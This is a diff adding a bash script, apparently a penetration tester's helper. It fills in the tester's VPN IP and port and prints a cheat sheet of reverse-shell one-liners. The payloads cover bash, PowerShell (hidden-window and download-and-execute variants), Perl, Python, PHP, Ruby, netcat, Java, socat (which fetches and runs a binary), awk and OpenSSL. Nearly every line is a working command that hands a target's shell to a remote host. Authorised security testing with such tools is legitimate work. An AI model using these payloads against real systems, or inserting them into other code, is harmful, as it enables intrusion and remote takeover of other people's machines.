@@ -1,0 +1,98 @@
+#!/bin/bash
+
+RESET="\033[0m"
+Green="\033[0;32m"
+Yellow='\033[0;33m'
+Red='\033[0;31m' 
+Purple='\033[0;35m'
+BGreen='\033[1;32m' # Bold Green
+BYellow='\033[1;33m' # Bold Yellow
+BRed='\033[1;31m' # Bold Red
+
+# Make port number bold, so the pentester can notice it
+if [ -z $1 ]; then
+    LPORT=${BYellow}'443'${Yellow}
+else
+    LPORT=${BYellow}$1${Yellow}
+fi
+
+# Get current VPN IP if tun0 is set
+LHOST=$(ifconfig | grep -A1 tun0 | grep inet | awk '{print $2}')
+if [ -z $LHOST ]; then
+    LHOST=${BRed}'IP'${Yellow}
+else
+    LHOST=${BYellow}${LHOST}${Yellow}
+fi
+
+# Get current target IP if set
+RHOST=$(show-target-ip)
+if [ -z $RHOST ]; then
+    RHOST=${BRed}'TARGET-IP'${Yellow}
+fi
+
+echo "-> More reverse shells: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#revshells"
+echo -e "\nPossible shells on target: ${Purple}sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash${RESET}"
+
+echo -e "\n${BGreen}MSFVENOM${RESET}"
+echo -e "${Yellow}msfvenom -l payloads | grep \"cmd/unix\" | awk '{print \$1}'${RESET} -> Shows available UNIX one-liners"
+echo -e "${Yellow}msfvenom -l payloads | grep \"cmd/windows\" | awk '{print \$1}'${RESET} -> Shows available WINDOWS one-liners"
+echo -e "${Yellow}msfvenom -p cmd/unix/reverse_netcat LHOST=${LHOST} LPORT=${LPORT} R${RESET} -> Example of netcat reverse shell"
+
+echo -e "\n${BGreen}BASH${RESET}"
+echo -e "${Yellow}bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1${RESET}"
+echo -e "${Yellow}bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1${RESET} -> UDP client, ${Yellow}nc -u -lvp ${LPORT}${RESET} -> UDP Listener"
+echo -e "${Yellow}exec 5<> /dev/tcp/${LHOST}/${LPORT} && cat <&5 | while read line; do $line 2>&5 >&5; done${RESET}"
+echo -e "${Yellow}0<&196;exec 196<>/dev/tcp/${LHOST}/${LPORT}; sh <&196 >&196 2>&196${RESET}"
+echo -e "${Yellow}/bin/bash -l > /dev/tcp/${LHOST}/${LPORT} 0<&1 2>&1${RESET}"
+
+echo -e "\n${BGreen}POWERSHELL${RESET}"
+echo -e "${Yellow}powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"${LHOST}\",${LPORT});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()${RESET}"
+echo -e "\n${Yellow}powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient('${LHOST}',${LPORT});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\"${RESET}"
+echo -e "\n${Yellow}powershell IEX (New-Object Net.WebClient).DownloadString('${LHOST}/path_to_.ps1')${RESET} -> https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1"
+
+
+echo -e "\n${BGreen}PERL${RESET}"
+echo -e "${Yellow}perl -e 'use Socket;\$i=\"${LHOST}\";\$p=${LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'${RESET}"
+echo -e "\n${Yellow}perl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"${LHOST}:${LPORT}\");STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>;'${RESET}"
+echo -e "\n${Yellow}perl -MIO -e '\$c=new IO::Socket::INET(PeerAddr,\"${LHOST}:${LPORT}\");STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>;'${RESET} -> Windows only"
+
+echo -e "\n${BGreen}PYTHON${RESET}"
+echo -e "${Yellow}python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${LHOST}\",${LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'${RESET} -> Python 2.7"
+echo -e "\n${Yellow}export RHOST=\"${LHOST}\";export RPORT=${LPORT};python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'${RESET} -> Linux only"
+echo -e "\n${Yellow}python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${LHOST}\",${LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'${RESET} -> Linux only"
+
+echo -e "\n${BGreen}PHP${RESET}"
+echo -e "${Yellow}php -r '\$sock=fsockopen(\"${LHOST}\",${LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'${RESET}"
+echo -e "${Yellow}php -r '\$sock=fsockopen(\"${LHOST}\",${LPORT});passthru(\"/bin/sh -i <&3 >&3 2>&3\");'${RESET}"
+
+echo -e "\n${BGreen}RUBY${RESET}"
+echo -e "${Yellow}ruby -rsocket -e'f=TCPSocket.open(\"${LHOST}\",${LPORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'${RESET}"
+
+echo -e "\n${BGreen}NETCAT${RESET}"
+echo -e "${Yellow}nc -e /bin/sh ${LHOST} ${LPORT}${RESET}"
+echo -e "${Yellow}rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${LHOST} ${LPORT} >/tmp/f${RESET}"
+
+echo -e "\n${BGreen}JAVA${RESET}"
+echo -e "${Yellow}r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/${LHOST}/${LPORT};cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[]); p.waitFor();${RESET}"
+
+echo -e "\n${BGreen}XTERM${RESET}"
+echo -e "${Yellow}xterm -display ${LHOST}:${BYellow}1${RESET} -> Target/Client (port is 6001)"
+echo -e "${Yellow}xhost +${RHOST}${RESET} -> Authorise Client to connect (run on Server's host)"
+echo -e "${Yellow}Xnest :${BYellow}1${RESET} -> Listener/Server (port is 6001)"
+
+echo -e "\n${BGreen}SOCAT${RESET}"
+echo -e "${Yellow}socat file:\`tty\`,raw,echo=0 TCP-L:${LPORT}${RESET} -> Listener/Server"
+echo -e "${Yellow}/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${LHOST}:${LPORT}${RESET} -> Victim/Client"
+echo -e "${Yellow}wget -q ${LHOST}/<path_to_socat_binary> -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${LHOST}${Yellow}:${LPORT}${RESET} -> one-liner"
+
+echo -e "\n${BGreen}AWK${RESET}"
+echo -e "${Yellow}awk 'BEGIN {s = \"/inet/tcp/0/${LHOST}/${LPORT}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null${RESET}"
+
+echo -e "\n${BGreen}OPENSSL${RESET}"
+echo -e "${Yellow}openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes${RESET} -> Generate keys for server"
+echo -e "${Yellow}openssl s_server -quiet -key key.pem -cert cert.pem -port ${LPORT}${RESET} OR  ${Yellow}ncat --ssl -vv -l -p ${LPORT}${RESET} -> Run the server"
+echo -e "${Yellow}mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ${LHOST}:${LPORT} > /tmp/s; rm /tmp/s${RESET} -> Client"
+
+echo -e "\n${Yellow}openssl rand -hex 48${RESET} -> Generate PSK"
+echo -e "${Yellow}export LHOST=\"*\"; export LPORT=\"${LPORT}\"; export PSK=\"${Bred}PSK${Yellow}\"; openssl s_server -quiet -tls1_2 -cipher PSK-CHACHA20-POLY1305:PSK-AES256-GCM-SHA384:PSK-AES256-CBC-SHA384:PSK-AES128-GCM-SHA256:PSK-AES128-CBC-SHA256 -psk \$PSK -nocert -accept \$LHOST:\$LPORT${RESET} -> Run the server"
+echo -e "${Yellow}export RHOST=\"${LHOST}\"; export RPORT=\"${LPORT}\"; export PSK=\"${Bred}PSK${Yellow}\"; export PIPE=\"/tmp/\`openssl rand -hex 4\`\"; mkfifo \$PIPE; /bin/sh -i < \$PIPE 2>&1 | openssl s_client -quiet -tls1_2 -psk \$PSK -connect \$RHOST:\$RPORT > \$PIPE; rm \$PIPE${RESET} -> Client"
